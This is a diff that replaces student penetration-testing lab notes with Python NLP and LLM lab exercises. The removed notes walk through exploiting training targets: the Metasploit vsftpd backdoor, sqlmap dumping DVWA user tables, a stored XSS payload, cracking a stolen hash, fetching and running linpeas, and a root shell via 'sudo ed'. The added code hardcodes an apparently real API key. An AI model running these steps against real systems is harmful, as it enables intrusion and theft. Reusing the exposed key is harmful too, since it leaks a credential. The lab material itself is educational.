@@ -1,192 +1,289 @@
-Part A: Active Recon using Nmap
-Goal: Find live devices, open ports, and what services/OS they might be running.
- Ping Scan (Find Live Hosts):
-nmap -sn 192.168.1.0/24
- Port Scan (Find Open Ports):
-nmap -sS 192.168.1.5
- Service & OS Detection:
- nmap -sV -O 192.168.1.5
- Save Results to File (Optional):
-nmap -sV -O -oN scan_report.txt 192.168.1.5
+import gensim.downloader as api
 
-Part B: Passive Recon using Recon-ng or Amass
-Goal: Discover extra info like subdomains, hostnames, and metadata—without alerting the
-target.
-1. Option 1: Using Recon-ng
- recon-ng
-(You’ll enter the CLI for this tool)
-#workspaces create techsecure
-#add domains techsecurecorp.com
-#marketplace search whois
-(the above commands need not be executed but you can do it if you want, it would create a
-separate workspace to perform the remaining commands)
- marketplace install recon/domains-hosts/hackertarget
- modules load recon/domains-hosts/hackertarget
- options set SOURCE <target_weburl>
-(target_weburl can be anything like www.linkedin.com or www.google.com )
- Run
+model = api.load("glove-wiki-gigaword-50")
+
+word1 = "paris"
+word2 = "france"
+word3 = "india"
+word4 = "capital"
+
+vector_add = model[word1] + model[word4]
+vector_mix = model[word1] - model[word2] + model[word3]
+
+result_add = model.most_similar([vector_add], topn=1)
+result_mix = model.most_similar([vector_mix], topn=1)
+
+print(f"The result of '{word2} + {word4}' is: {result_add[0][0]}")
+print(f"The result of '{word1} - {word2} + {word3}' is: {result_mix[0][0]}")
+-----------------------------------------------------------------------------------------
+import gensim.downloader as api
+from sklearn.manifold import TSNE
+import matplotlib.pyplot as plt
+import numpy as np
+
+print("Loading word vectors...")
+model = api.load("glove-twitter-50")
+print("Model loaded.")
+
+words = ['wicket', 'innings', 'bowler', 'batsman', 'over', 'run', 'pitch',
+         'boundary', 'catch', 'cricket']
+
+valid_words = [word for word in words if word in model]
+word_vectors = np.array([model[word] for word in valid_words])
+
+tsne = TSNE(n_components=2, perplexity=5, random_state=0)
+word_vectors_2d = tsne.fit_transform(word_vectors)
+
+plt.figure(figsize=(8, 6))
+
+for i in range(len(valid_words)):
+    x = word_vectors_2d[i][0]
+    y = word_vectors_2d[i][1]
+    plt.scatter(x, y, color='blue')
+    plt.text(x + 0.1, y + 0.1, valid_words[i])
+
+plt.title("Cricket Word Embeddings (t-SNE Visualization)")
+plt.grid(True)
+plt.show()
+
+if 'cricket' in model:
+    print("\nWords most similar to 'cricket':")
+    for similar_word, score in model.most_similar('cricket', topn=5):
+        print(f"{similar_word:15} {score:.3f}")
+else:
+    print("'cricket' not found in the vocabulary.")
+--------------------------------------------------------------------------------------------
+import gensim
+from gensim.models import Word2Vec
+import nltk
+from nltk.tokenize import word_tokenize
+
+nltk.download('punkt')
+
+corpus = [
+    "A patient with diabetes requires regular insulin injections.",
+    "Medical professionals recommend exercise for heart health.",
+    "Doctors use MRI scans to diagnose brain disorders.",
+    "Antibiotics help fight bacterial infections but not viral infections.",
+    "The surgeon performed a complex cardiac surgery successfully.",
+    "Doctors and nurses work together to treat patients.",
+    "A doctor specializes in diagnosing and treating diseases."
+]
+
+tokenized_corpus = [word_tokenize(sentence.lower()) for sentence in corpus]
+
+model = Word2Vec(
+    sentences=tokenized_corpus,
+    vector_size=100,
+    window=3,
+    min_count=1,
+    workers=4,
+    sg=1
+)
+
+model.save("medical_word2vec.model")
+
+similar_words = model.wv.most_similar("doctor", topn=5)
+
+print("\nWords most similar to 'doctor':")
+for i, (word, similarity) in enumerate(similar_words, start=1):
+    print(f"{i}. {word} (Similarity Score: {similarity:.2f})")
+-------------------------------------------------------------------------------------------
+from transformers import pipeline
+import gensim.downloader as api
+
+glove_model = api.load("glove-wiki-gigaword-50")
+
+word = "technology"
+similar_words = glove_model.most_similar(word, topn=5)
+print(f"Similar words to '{word}': {similar_words}")
+
+generator = pipeline("text-generation", model="gpt2")
+
+def generate_response(prompt, max_length=100):
+    response = generator(prompt, max_length=max_length, num_return_sequences=1)
+    return response[0]['generated_text']
+
+original_prompt = "Explain the impact of technology on society."
+original_response = generate_response(original_prompt)
+
+enriched_prompt = (
+    "Explain the impact of technology, innovation, science, "
+    "engineering, and digital advancements on society."
+)
+enriched_response = generate_response(enriched_prompt)
+
+print("Original Prompt Response:")
+print(original_response)
+print("Enriched Prompt Response:")
+print(enriched_response)
 -------------------------------------------------------------------------------------------------
-Firstly 
+import gensim.downloader as gensim_api
 
-Login to metasploit and get the ip using ifconfig 
- 
-sudo apt install gvm 
-gvm-setup
-gvm-start 
+glove_model = gensim_api.load("glove-wiki-gigaword-50")
 
-Then minimise the web browser which was opened 
+def generate_paragraph(core_word, related_words):
+    passage = (
+        f"In a world shaped by {core_word}, innovation starts with a spark of {related_words[0][0]}. "
+        f"Each step in {related_words[1][0]} reveals breakthroughs that redefine {related_words[2][0]}. "
+        f"Engineers and thinkers collaborate to transform every {related_words[3][0]} into a leap toward "
+        f"{related_words[4][0]}."
+    )
+    return passage
 
-Run the command on the terminal
+main_word = "technology"
+top_matches = glove_model.most_similar(main_word, topn=5)
 
-sudo runuser -u _gvm -- gvmd --create-user=rahul --password=rahul
+generated_output = generate_paragraph(main_word, top_matches)
+print(generated_output)
+----------------------------------------------------------------------------------------------------------------
+from transformers import pipeline
 
-Then go to the greenbone website which was opened and refresh the browser 
+print("Loading sentiment analysis model...")
+sentiment_analyzer = pipeline("sentiment-analysis")
+print("Model loaded successfully!")
 
-Then use the login details. 
+test_texts = ["I love learning about AI"]
 
-After login. 
+print("\nAnalyzing texts...\n")
+for text in test_texts:
+    result = sentiment_analyzer(text)[0]
+    print(f"Text: {text}")
+    print(f"Sentiment: {result['label']}")
+    print(f"Confidence: {result['score']:.2f}")
+-------------------------------------------------------------------------------------------------------------
+from transformers import pipeline
 
-Click on configurations->click on targets
+summarizer = pipeline("summarization")
 
-On top left under targets click on new targets.( This option is next to question mark option( ?)
+text = (
+    "Artificial intelligence (AI) is a branch of computer science that aims to create intelligent machines "
+    "that work and react like humans. Some of the activities computers with AI are designed for include speech "
+    "recognition, learning, planning, and problem-solving. AI is being used across various industries including "
+    "healthcare, finance, and transportation. It continues to evolve rapidly and is expected to have a significant "
+    "impact on the future of work and everyday life."
+)
 
-Give a name and then write the metasploit ip address near manual option in hosts
+summary = summarizer(text)
 
-Then click on save. 
-
-Go to scans and choose tasks. Click on new tasks( next to ? ) 
-
-Give a name and use the target which u created in the previous step 
-
-Then choose CVE option instead of openVAS . Otherwise ull get error message. 
-
-Then click on save. 
-
-Then run the test by clicking on play button. 
-
-The task is over
----------------------------------------------------------------------------------------------
-1. Install Metasploit framework which is a powerful and widely used penetration testing
-platform that allows security professionals to identify and exploit vulnerabilities in systems.
- sudo su
-(To gain super user privileges)
- apt install metasploit-framework
-(Press ‘y’ if prompted, this installs all the necessary libraries including msfconsole and
-msfvenom)
-2. Launch Metasploit Console:
- msfconsole
-(You’ll enter the CLI for this)
-3. Search for the vsftpd vulnerability module:
- search vsftpd
-4. Use the identified exploit module:
- use exploit/unix/ftp/vsftpd_234_backdoor
-5. Set the target IP address (Metasploitable 2):
- set RHOSTS <target-IP>
-(Target-IP is metasploitable 2’s IP address)
-6. Run the exploit:
- exploit
-7. On success, you’ll get a shell access session (may be root).
-Verify access by running commands like `whoami`, `hostname`, or `ls`
- whoami
- hostname
- ls /etc
-------------------------------------------------------------------------------------------------------
-1. Now after noting down the ip address from metasploitable, open firefox in Kali Linux and then
-enter the following url (“<inet_address of metasploitable 2>/dvwa”).
-2. The default credentials are:
-Username:admin
-Password:password
-3. Then under DVWA security, set the security to low and submit it
-4. Then click on SQL Injection and then enter 1 in the search box and then submit it
-5. Now open the terminal in kali and then enter the following commands:
- To obtain the php sessid right click on the webpage and then click on inspect.
- Then go to storage and then click on the url on the left which will give the phpsessid
- Click on the phpsessid which would open a dialog box on the right.
- Right click on the phpsessid and then copy it.
- sqlmap -u “paste the url copied from the website” --cookie=”paste the phpsessid copied
-from the browser; security=low” --batch
-[This command is to check if sql injection can be performed]
- sqlmap -u “paste the url copied from the website” --cookie=”paste the phpsessid copied
-from the browser; security=low” --batch --dbs
-[This command is to extract all the available databases.]
- sqlmap -u “paste the url copied from the website” --cookie=”paste the phpsessid copied
-from the browser; security=low” --batch -D dvwa --tables
-[This command is to extract all the tables.]
- sqlmap -u “paste the url copied from the website” --cookie=”paste the phpsessid copied
-from the browser; security=low” --batch -D dvwa -T users --columns
-[This command is to extract all the columns of the table users in dvwa database.]
- sqlmap -u “paste the url copied from the website” --cookie=”paste the phpsessid copied
-from the browser; security=low” --batch -D dvwa -T users --dump
-[This command is to dump all the data present in the users table.]
---------------------------------------------------------------------------------------------------------------
-3. In BurpSuite go to the Proxy tab and open the Embedded Browser and access the Juice
-Shop Application by navigating to http://localhost:3000 in the embedded browse
-4. In BurpSuite, ensure that Intercept is turned on under the Proxy tab
-5. In the browser, append /api/Quantitys to the URL so it becomes:
-http://localhost:3000/#/api/Quantitys and press ENTER to initiate the request
-6. Inspect HTTP History:
-In Burp Suite, go to the HTTP History tab. Locate the request containing:
-GET /api/Quantitys
-7. Send the Request to Repeater:
-➢ In the Repeater tab, change the request path from:
-/api/Quantitys
-to
-/api/Products/4
-➢ Modify the Connection header from keep-alive to:
-close
-➢ Change the request method from GET to PUT and add the following header
-after Accept:
-Content-Type: application/json; charset=utf-8
-➢ Inject XSS Payload into Request Body:
-{
-"description": "<iframe src=\"javascript:alert('xss')\">"
-}
-Send the Modified Request:
-Click Send to deliver the modified request to the server.
-Verify Payload Execution:
-In the embedded browser, search for “raspberry” in the Juice Shop interface. Click
-on the product “Raspberry Juice (1000ml)”
+print(summary[0]['summary_text'])
 -------------------------------------------------------------------------------------------------------------------
-1. Open the terminal in Kali Linux and enter the following commands:
- netdiscover
-2. Then from the list of ip addresses, note down the ip address of the system with the name
-PCS.
-3. Then enter the following command to scan the system for open ports and services:
- nmap -A <ip_address>
-[The ftp port should be opened and then anonymous login should be allowed]
-4. Then type the following command to establish connection between the 2 systems so that file
-transfer can occur:
- ftp <ip_address>
-5. You’ll enter the CLI for the ftp session, enter the following command to obtain the backup
-data from the target machine:
- get backup
- exit
-6. Now in the terminal of kali linux open the backup file and then copy the hash of the sunset
-machine and save it in a file named ‘hashh’ using nano and dehash the hashed password using
-“john” using the following commands:
- cat backup
- nano hashh
-[Ctrl+X > Press ‘Y’ > Enter]
- john hashh
-[The password should be cracked, it would take around 5 minutes to execute the
-command]
-7. If the john says that it has already cracked the password then execute the following
-commands:
- cd ~
- rm .john/john.pot
- nano hashh
-[(Save the hashed password in this file)Ctrl+X > Press ‘Y’ > Enter]
- john hashh
---------------------------------------------------------------------------------------------------------------------
-Download and execute LinPEAS file from Github by running the commands below:
-wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
-• Executed the ed program using sudo:
-sudo ed
-• Inside the ed editor, used the ! escape feature to spawn a shell as root:
-! /bin/sh
-• Verified successful privilege escalation by checking current user and user ID:
-whoami → Output: root
-id → Output: uid=0(root) gid=0(root) groups=0(root)
--------------------------------------------------------------------------------------------------------------------
+import os
+from cohere import Client
+from langchain.prompts import PromptTemplate
+
+os.environ["COHERE_API_KEY"] = "Generate your own API key"
+co = Client(os.getenv("COHERE_API_KEY"))
+
+with open(r"C:\Users\Admin\Documents\AI.txt", "r", encoding="utf-8") as file:
+    text_document = file.read()
+
+template = """
+You are an expert summarizer. Summarize the following text in a concise manner:
+Text: {text}
+Summary:
+"""
+
+prompt_template = PromptTemplate(input_variables=["text"], template=template)
+formatted_prompt = prompt_template.format(text=text_document)
+
+response = co.generate(
+    model="command",
+    prompt=formatted_prompt,
+    max_tokens=40
+)
+
+print("Summary:")
+print(response.generations[0].text.strip())
+-----------------------------------------------------------------------------------------------------------------------
+import wikipedia
+from pydantic import BaseModel
+from typing import Optional
+import json
+
+class InstitutionInfo(BaseModel):
+    name: str
+    founder: Optional[str]
+    founding_year: Optional[int]
+    summary: str
+
+def get_institution_info(name: str) -> Optional[InstitutionInfo]:
+    try:
+        page_title = wikipedia.search(name)[0]
+        page = wikipedia.page(page_title)
+        content = page.content.lower()
+        summary = wikipedia.summary(page_title, sentences=5)
+        founder = next(
+            (line.split("founded by")[1].split('.')[0].strip().title()
+             for line in content.split('\n') if "founded by" in line),
+            None
+        )
+        year = next(
+            (int(word) for word in content.split() if word.isdigit() and len(word) == 4),
+            None
+        )
+        return InstitutionInfo(
+            name=page.title,
+            founder=founder,
+            founding_year=year,
+            summary=summary
+        )
+    except Exception as e:
+        print(f"Error: {e}")
+        return None
+
+if __name__ == "__main__":
+    name = input("Enter Institution Name: ")
+    info = get_institution_info(name)
+    if info:
+        print(json.dumps(info.dict(), indent=2))
+------------------------------------------------------------------------------------------------------------------
+from pypdf import PdfReader
+from cohere import Client
+
+co=Client("XgHOwe0YWKhnr5Tt8lxYl6QORGVGux7C2MXTOaop")
+textdoc=PdfReader(r"file location")
+
+text=""
+for page in textdoc.pages:
+    text+=page.extract_text()
+
+def ipc(q):
+    prompt=f"""
+    you are a Indian penal code bot. use the following content to answer the user
+    {text[:1000]}
+    user question:{q}
+    answer and be precise with ipc sections
+    """
+    res=co.generate(
+        prompt=prompt,
+        model="command-r-plus",
+        max_tokens=300
+    )
+    print(""+res.generations[0].text.strip())
+que=input("question:")
+print(ipc(que))
+-------------------------------------------------------------------------------------------------------------------------------------
+from PyPDF2 import PdfReader
+import re
+
+text = "".join([page.extract_text() for page in PdfReader("ipc.pdf").pages[5:50]])
+
+sections = [s.replace('\n', ' ').strip() for s in re.findall(r'(\d+\..*?)(?=\n\d+\.|\Z)', text, re.DOTALL)]
+
+def ipc_bot(q):
+    q = q.lower()
+    for sec in sections:
+        match = re.search(r'section\s*(\d+)', q)
+        if match and sec.startswith(f"{match.group(1)}."):
+            return sec.split('.', 1)[1].strip().split('.')[0] + "."
+        if any(word in sec.lower() for word in q.split()):
+            return sec.split('.', 1)[1].strip().split('.')[0] + "."
+    return "No match."
+
+while True:
+    q = input("You: ")
+    if q.lower() in ['exit', 'quit']:
+        break
+    print("IPC Bot:", ipc_bot(q))
+
